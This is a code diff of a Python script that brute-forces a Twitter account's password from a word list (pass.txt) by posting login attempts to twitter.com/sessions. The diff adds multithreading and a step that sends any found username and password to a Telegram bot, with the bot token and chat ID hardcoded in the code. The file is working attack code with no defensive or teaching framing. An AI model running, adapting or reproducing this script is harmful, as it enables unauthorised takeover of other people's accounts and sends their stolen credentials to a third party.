@@ -1,9 +1,9 @@
+import os
 import requests
 import random 
-import json
-import time
-from bs4 import BeautifulSoup
+import threading
 import pyfiglet
+
 
 
 
@@ -19,7 +19,6 @@ B = '\033[2;36m'#سمائي
 Y = '\033[1;34m' #ازرق فاتح
 
 # = = = = = = = = = = = =
-time.sleep(0)
 logo = pyfiglet.figlet_format('Dulaymy')
 print(B+logo)
 print(R+'* '*15+A)
@@ -29,19 +28,24 @@ Words = ['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', '
 token = (random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words))
 ct0 = ''
 auth_token = ''
-tweets = open('pass.txt', 'r', encoding='utf-8')
+tweets = open('pass.txt', 'r')
+
+#numf= len(open('pass.txt', 'r').read().split('\n'))
 
 	
 username = input(str("Enter username : "))
+threa= int(input(str("Enter Threading 1 : ")))
+
 #password = input(str("Enter password : "))
 
 
 		
-times =5 # int(input("Tweet every (Seconds) : "))
-updatecook =50 #int(input("cookies update  after ( ? ) tweets : "))
 
+ID =5046952858 # input('• ايدي  : ')
+token ='5366139923:AAHpR63XiZmYUGaN0pdONyHYAvNJqze4QlA' # input('• توكن  : ')
 
 def login():
+	password = tweets.readline().split('\n')[0]
 	session = requests.Session()
 	url = "https://twitter.com/sessions"
 	session.headers = {
@@ -60,13 +64,25 @@ def login():
 	}
 	response = session.post(url, data=data , cookies=cookies)
 	r = session.cookies.get_dict()
-	return (r['dnt'])
-
-while True:
-	password = tweets.readline().split('\n')[0]
 	try:
-		if(login() == '1'):
+		if(r['dnt']):
 			print(Y+"Password is : "+G+password)
-			break
+			req=requests.session()
+			tlg =(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= 
+Username : {username}
+Password : {password} 
+''')
+			i = req.post(tlg)
+
+			os._exit(0)
 	except:
 		print(R+password)
+while True:
+	threads = []
+	for i in range(threa):
+		thread1= threading.Thread(target=login,args=())
+		thread1.start()
+		threads.append(thread1)
+	for thread2 in threads:
+		thread2.join()
+		
